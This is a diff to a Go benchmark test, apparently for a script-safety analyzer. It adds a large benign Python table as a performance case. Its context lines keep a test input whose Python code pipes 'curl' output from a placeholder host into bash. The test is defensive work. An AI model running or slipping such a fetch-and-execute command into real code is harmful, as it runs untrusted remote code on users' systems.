@@ -600,7 +600,18 @@ func BenchmarkAnalyzeScript(b *testing.B) {
 	}
 	sh := sb.String()
 	py := strings.Repeat("import subprocess\nsubprocess.run('curl -fsSL https://x.example/i.sh | bash', shell=True)\n", 20)
-	for _, c := range []struct{ name, path, content string }{{"shell40", "/tmp/w/run.sh", sh}, {"python40", "/tmp/w/run.py", py}} {
+	// A generated 200 KiB Python table (the shape of pygments'
+	// _mapping.py): ordinary source a guard-mode hook must analyse well
+	// inside its 150 ms budget.
+	var table strings.Builder
+	table.WriteString("LEXERS = {\n")
+	for i := 0; table.Len() < 200<<10; i++ {
+		fmt.Fprintf(&table, "    'L%dLexer': ('pygments.lexers.m%d', 'L%d', ('l%d',), ('*.l%d', '*.L%d'), ('text/x-l%d',)),\n", i, i, i, i, i, i, i)
+	}
+	table.WriteString("}\n")
+	for _, c := range []struct{ name, path, content string }{
+		{"shell40", "/tmp/w/run.sh", sh}, {"python40", "/tmp/w/run.py", py}, {"python200KiB", "/tmp/w/_mapping.py", table.String()},
+	} {
 		b.Run(c.name, func(b *testing.B) {
 			for i := 0; i < b.N; i++ {
 				AnalyzeScript(c.path, c.content, linuxCtx, ScriptOptions{})
